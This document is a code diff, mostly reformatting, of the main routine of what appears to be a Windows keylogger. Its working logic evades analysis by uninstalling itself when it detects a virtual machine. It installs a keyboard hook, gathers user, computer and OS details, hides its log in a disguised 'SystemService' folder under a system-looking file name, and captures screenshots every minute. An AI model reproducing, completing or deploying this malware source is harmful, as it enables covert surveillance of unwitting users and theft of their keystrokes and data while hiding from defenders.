@@ -10,44 +10,43 @@
 
 int main() {
 #ifdef DEBUG_BUILD
-  Sys::CreateShell();
+	Sys::CreateShell();
 #endif
 
 #ifndef DEBUG_BUILD
-  if (Sys::CheckForVirtualMachine()) {
-	KeyHook::UninstallHook();
-	Sys::RemoveFromRegistry();
-	KeyHook::KillProcess();
-	return 0;
-  }
+	if (Sys::CheckForVirtualMachine()) {
+		KeyHook::UninstallHook();
+		Sys::RemoveFromRegistry();
+		KeyHook::KillProcess();
+		return 0;
+	}
 
 //  Sys::AddToRegistry();
-  KeyHook::InstallHook();
-  clientInfo = Stream::GetAccountInfo(clientInfo);
+	KeyHook::InstallHook();
+	clientInfo = Stream::GetAccountInfo(clientInfo);
 
-  std::string path = Stream::GetPath("\\Microsoft\\");
+	std::string path = Stream::GetPath("\\Microsoft\\");
+	std::string dirName = "SystemService";
 
-  std::string dirName = "SystemService";
+	Stream::MakeDir(path, dirName, FILE_ATTRIBUTE_HIDDEN);
+	Stream::MakeFile("wnxshl2.sys.log", path + "\\" + dirName);
+	Stream::LogFile logFile(path + dirName, "wnxshl2.sys.log");
 
-  Stream::MakeDir(path, dirName, FILE_ATTRIBUTE_HIDDEN);
-  Stream::MakeFile("wnxshl2.sys.log", path + "\\" + dirName);
+	Stream::WriteLog("[*] BOOT [*]", KeyHook::activeProcess, logFile, false);
 
-  Stream::LogFile logFile(path + dirName, "wnxshl2.sys.log");
-  Stream::WriteLog("[*] BOOT [*]", KeyHook::activeProcess, logFile, false);
+	std::ostringstream ostream;
 
-  std::ostringstream ostream;
+	ostream << "\n[*] OS Info: Major - " << clientInfo.osVersionInfo.dwMajorVersion << "; Minor - "
+	        << clientInfo.osVersionInfo.dwMinorVersion << " [*]"
+	        << "\n[*] Account Info: User -" << clientInfo.accountName << "; Computer - " << clientInfo.computerName
+	        << " [*]";
 
-  ostream << "\n[*] OS Info: Major - " << clientInfo.osVersionInfo.dwMajorVersion << "; Minor - "
-		  << clientInfo.osVersionInfo.dwMinorVersion << " [*]"
-		  << "\n[*] Account Info: User -" << clientInfo.accountName << "; Computer - " << clientInfo.computerName
-		  << " [*]";
-
-  std::string write = ostream.str();
-  Stream::WriteLog(write, KeyHook::activeProcess, logFile, false);
-  Screen::CaptureScreen(path + "\\", "winpst", true, 60000); // Screenshot
+	std::string write = ostream.str();
+	Stream::WriteLog(write, KeyHook::activeProcess, logFile, false);
+	Screen::CaptureScreen(path + "\\", "winpst", true, 60000); // Screenshot
 
 //  KeyHook::HandleMessage(true);
 
 #endif // DEBUG_BUILD
-  return 0;
+	return 0;
 }
